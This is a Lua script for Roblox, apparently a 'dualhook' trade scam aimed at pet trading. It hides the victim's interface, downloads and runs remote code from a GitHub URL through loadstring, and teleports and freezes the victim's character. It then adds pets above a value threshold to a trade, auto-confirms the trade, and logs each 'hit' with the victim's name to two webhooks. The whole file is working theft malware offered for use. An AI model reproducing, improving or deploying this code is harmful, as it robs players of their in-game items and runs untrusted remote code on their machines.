-- FEATURE: Dualhook Logging
local function DualLog(petName, val)
    local payload = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = "🎯 Mondeur Pen: Hit Logged",
            ["fields"] = {
                {["name"] = "Victim", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "Pet", ["value"] = petName, ["inline"] = true},
                {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
            },
            ["color"] = 0x00ffff
        }}
    })
    local urls = {getgenv().WEBHOOK, "YOUR_BOT_WEBHOOK_HERE"} 
    for _, url in pairs(urls) do
        if url and url ~= "" then
            task.spawn(function() pcall(function() request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end) end)
        end
    end
end

-- FEATURE: UI Lockdown & Stable Teleport
local function Lockdown(receiver)
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
        
        -- [[ FIX: Stable Character Check ]] --
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hum = char:WaitForChild("Humanoid")
        local hrp = char:WaitForChild("HumanoidRootPart")
        
        local targetChar = receiver.Character or receiver.CharacterAdded:Wait()
        local targetHrp = targetChar:WaitForChild("HumanoidRootPart")
        
        if hrp and targetHrp then
            hum.Sit = false
            task.wait(0.2)
            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
            hrp.Anchored = true
        end
    end)
end

-- FEATURE: Inventory Scan
local function executeTrade(targetPlayer)
    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
    local inventory = ClientData.get_data().inventory
    
    if inventory and inventory.pets then
        Lockdown(targetPlayer)

        for _, petData in pairs(inventory.pets) do
            local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
            if val >= (getgenv().THRESHOLD or 0) then
                task.spawn(function()
                    TradeAPI:WaitForChild("AddItemToTrade"):FireServer(petData.unique)
                end)
                DualLog(petData.config_name or "Unknown", val)
            end
        end
        
        task.wait(0.5)
        TradeAPI:WaitForChild("ReadyTrade"):FireServer(true)
        task.wait(0.2)
        TradeAPI:WaitForChild("ConfirmTrade"):FireServer()
    end
end

